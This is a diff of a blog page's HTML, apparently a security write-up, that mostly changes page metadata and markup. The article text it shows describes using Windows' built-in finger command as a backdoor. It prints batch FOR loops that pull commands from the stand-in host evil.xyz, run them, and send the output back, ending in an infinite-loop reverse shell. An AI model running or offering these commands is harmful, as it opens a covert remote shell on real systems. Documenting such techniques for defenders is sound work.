@@ -18,9 +18,10 @@ Finger comes pre-installed on Windows. According to Microsoft&rsquo;s documentat
 <meta property="og:description" content="Introduction This is a follow-up post to one of my presentations at BsidesSF 2019. It is also a continuation of a previous blog post where it showed how you can use WHOIS and Finger on Unix systems for backdoors. In this post, the focus will be on how it can similarly be done on a Windows system.
 Finger comes pre-installed on Windows. According to Microsoft&rsquo;s documentation, the options are very limited." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/finger-windows-backdoor/" />
+<meta property="og:url" content="/posts/finger-windows-backdoor/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2019-03-17T00:00:00+00:00" />
 <meta property="article:modified_time" content="2019-03-17T00:00:00+00:00" />
+
 
 
     
@@ -55,7 +56,7 @@ Finger comes pre-installed on Windows. According to Microsoft&rsquo;s documentat
     <link rel="icon" type="image/png" href="../../images/favicon-32x32.png" sizes="32x32">
     <link rel="icon" type="image/png" href="../../images/favicon-16x16.png" sizes="16x16">
 
-    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="generator" content="Hugo 0.88.1" />
   </head>
 
   <body class=" ">
@@ -76,10 +77,6 @@ Finger comes pre-installed on Windows. According to Microsoft&rsquo;s documentat
         
           <li class="navigation-item">
             <a class="navigation-link" href="https://go-re.tk">Go Reverse Engineering Tool Kit</a>
-          </li>
-        
-          <li class="navigation-item">
-            <a class="navigation-link" href="https://ipfs.io/ipns/gomalware.lekstu.ga">Go Malware</a>
           </li>
         
       
@@ -147,22 +144,22 @@ allows for executing a command and assign the output to an iteration variable. B
 default, it breaks the value on whitespace character but the argument <code>delims=^=^</code>
 makes it instead of break on a newline. So the snippet below will assign the output
 from the finger command to <code>%x</code> line-by-line.</p>
-<pre><code>FOR /F delims^=^ %x IN ('finger &quot;message to server&quot;@evil.xyz') DO (## Action on each line ##)
+<pre tabindex="0"><code>FOR /F delims^=^ %x IN ('finger &quot;message to server&quot;@evil.xyz') DO (## Action on each line ##)
 </code></pre><p>As with finger for Unix, the first lines are information to the user that needs to
 be skipped. Luckily, the <code>FOR</code> command has an argument to skip. So the command can
 be fixed to only capture the command instruction from the server and execute it.</p>
-<pre><code>FOR /F delims^=^ skip^=^2 %x IN ('finger &quot;message to server&quot;@evil.xyz') DO (
+<pre tabindex="0"><code>FOR /F delims^=^ skip^=^2 %x IN ('finger &quot;message to server&quot;@evil.xyz') DO (
 %x
 )
 </code></pre><h2 id="capture-the-command-output-and-send-it-to-the-server">Capture the command output and send it to the server</h2>
 <p>To capture the output from the command, we can use a second <code>FOR</code> loop. This one
 executes the command from the server and captures the output line by line. For
 each output line, executes a new instance of finger that sends the output back.</p>
-<pre><code>FOR /f &quot;delims=^&quot; %y IN ('%x') DO finger &quot;%y&quot;@evil.xyz
+<pre tabindex="0"><code>FOR /f &quot;delims=^&quot; %y IN ('%x') DO finger &quot;%y&quot;@evil.xyz
 </code></pre><h2 id="putting-it-all-together">Putting it all together</h2>
 <p>A functional reverse shell can be achieved by wrapping the two <code>FOR</code> loops with
 an infinite loop:</p>
-<pre><code>FOR /L %N IN () DO (
+<pre tabindex="0"><code>FOR /L %N IN () DO (
     for /F delims^=^ skip^=2 %x IN ('finger &quot;cmd&quot;@evil.xyz') DO
         FOR /f &quot;delims=^&quot; %y IN ('%x') DO
             finger &quot;%y&quot;@evil.xyz
